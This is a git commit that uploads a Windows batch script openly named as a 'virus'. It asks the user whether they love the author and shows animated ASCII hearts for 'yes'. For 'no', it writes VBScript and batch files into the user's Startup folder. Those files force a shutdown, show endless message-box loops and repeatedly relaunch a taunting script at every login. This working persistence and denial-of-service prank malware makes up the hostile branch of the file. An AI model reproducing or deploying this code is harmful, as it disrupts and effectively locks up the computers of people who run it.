e2c5c1023ac9d16f023fc4aef57d4adca02b6c89
Vishal <monster.tech97@gmail.com>
2020-09-24 12:10:41 +0530

    Add files via upload

---
+++ I Love You Virus  Very Very Harmful.bat
@@ -0,0 +1,148 @@
+@echo off
+color 0A
+echo.
+echo.
+echo.
+echo ---------------------------------------------------
+echo.
+Echo            Hello! %username%, Do you Love me?
+echo.
+echo       [Only Answer in Yes or No.]
+echo.
+echo.
+echo.
+echo ---------------------------------------------------
+echo.
+set /p ans="Give me Your Answer : "
+if /i %ans%==yes goto love
+if /i %ans%==no goto hate
+
+
+
+:love
+color 0C
+mode con: cols=65 lines=45
+
+echo        "??????????????????????????????????????????????????"
+echo        "                                                  "
+echo        "                                                  "
+echo        "                                                  "
+echo        "                                                  "
+echo        "         ./osyyyso/-          .:+ossso+:.         "
+echo        "       -syyyyyyyyyyys/`    `/syyyyyyyyyyyo-       "
+echo        "     `oyyyyyyyyyyyyyyys-  -syyyyyyyyyyyyyyy+`     "
+echo        "     oyyyyyyyyyyyyyyyyyy::yyyyyyyyyyyyyyyyyyo     "
+echo        "    :yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy:    "
+echo        "    oyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyo    "
+echo        "    syyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyys    "
+echo        "    oyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy+    "
+echo        "    .yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy.    "
+echo        "     -yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyys-     "
+echo        "      `+yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy/`      "
+echo        "        `/syyyyyyyyyyyyyyyyyyyyyyyyyyyyo:`        "
+echo        "           ./syyyyyyyyyyyyyyyyyyyyyyo/`           "
+echo        "              ./syyyyyyyyyyyyyyyyo:`              "
+echo        "                 ./yyyyyyyyyyyy/.                 "
+echo        "                   `:syyyyyyy/`                   "
+echo        "                     `/yyyy/`                     "
+echo        "                       .os.                       "
+echo        "                        ``                        "
+echo        "                                                  "
+echo        "                                                  "
+echo        "                                                  "
+echo        "??????????????????????????????????????????????????"
+ping        localhost -n 2 -w 250>nul
+cls        
+echo        "??????????????????????????????????????????????????"
+echo        "                                                  "
+echo        "                                                  "
+echo        "                                                  "
+echo        "                                                  "
+echo        "                                                  "
+echo        "                `                                 "
+echo        "            -+syyys+-`     ./osyss+-`             "
+echo        "          -syyyyyyyyys:  -syyyyyyyyys:            "
+echo        "         -yyyyyyyyyyyyy+/yyyyyyyyyyyyy:           "
+echo        "         syyyyyyyyyyyyyyyyyyyyyyyyyyyyy`          "
+echo        "        `yyyyyyyyyyyyyyyyyyyyyyyyyyyyyy.          "
+echo        "        `yyyyyyyyyyyyyyyyyyyyyyyyyyyyyy`          "
+echo        "         :yyyyyyyyyyyyyyyyyyyyyyyyyyyy/           "
+echo        "          -syyyyyyyyyyyyyyyyyyyyyyyys-            "
+echo        "            -+yyyyyyyyyyyyyyyyyyyy+-              "
+echo        "              `-+syyyyyyyyyyyyy+-                 "
+echo        "                  -+yyyyyyyyo-                    "
+echo        "                    `/yyyyo.                      "
+echo        "                      .os-                        "
+echo        "                        `                         "
+echo        "                                                  "
+echo        "                                                  "
+echo        "                                                  "
+echo        "                                                  "
+echo        "                                                  "
+echo        "??????????????????????????????????????????????????"
+ping        localhost -n 2 -w 250>nul
+cls         
+echo        "??????????????????????????????????????????????????"
+echo        "                                                  " 
+echo        "                                                  " 
+echo        "                                                  " 
+echo        "                                                  " 
+echo        "                                                  " 
+echo        "                                                  " 
+echo        "                                                  " 
+echo        "                                                  " 
+echo        "                `:///-     .://:.                 " 
+echo        "              `+yyyyyyy: -syyyyyyo`               " 
+echo        "              +yyyyyyyyysyyyyyyyyys               " 
+echo        "             `yyyyyyyyyyyyyyyyyyyyy.              " 
+echo        "              oyyyyyyyyyyyyyyyyyyys               " 
+echo        "              `+yyyyyyyyyyyyyyyyy+`               " 
+echo        "                `:oyyyyyyyyyyyo:`                 " 
+echo        "                   `-oyyyyyo:`                    " 
+echo        "                      .+yo-                       " 
+echo        "                        .                         " 
+echo        "                                                  " 
+echo        "                                                  " 
+echo        "                                                  " 
+echo        "                                                  " 
+echo        "                                                  " 
+echo        "                                                  " 
+echo        "                                                  " 
+echo        "??????????????????????????????????????????????????"
+ping localhost -n 2 -w 250>nul
+cls
+goto love
+pause
+
+:hate
+::This Script will damage your computer so please don't try to remove :: doulbe colon from this script.
+echo set shell=CreateObject("Wscript.Shell") >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bad.vbs"
+echo shell.run "shutdown.exe -s -f -t 500" >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bad.vbs"
+echo Do >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bad.vbs"
+echo x=msgbox("Tu to gaya Beta",0+48+4096,"%Hacked% %Hacked%") >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bad.vbs"
+echo Loop >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bad.vbs"
+cls
+echo set bat=CreateObject("Wscript.Shell") >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rat.vbs"
+echo do >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rat.vbs"
+echo bat.run "hacker.bat" >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rat.vbs"
+echo loop >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rat.vbs"
+cls
+echo @echo off >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hacker.bat"
+echo color 0C >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hacker.bat"
+echo :hack >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hacker.bat"
+echo I am Watching you. I am your Boss. I hacked you Baby. >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hacker.bat"
+echo goto hack >>"%Systemdrive%\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hacker.bat"
+cls
+::this is dangerous 
+::when your pc will shutdown and you start again then they the files will  be run 
+
+::so for abourting shutdown type "shutdown -a" in run command
+
+
+
+
+echo I Hate you... 
+echo Now your PC Will be Hacked!!
+echo Your PC will Shutdown in 1 Minute 
+::timeout 5 /nobreak >nul
+::Shutdown.exe -s -t 100 /c "Now your PC in my control"
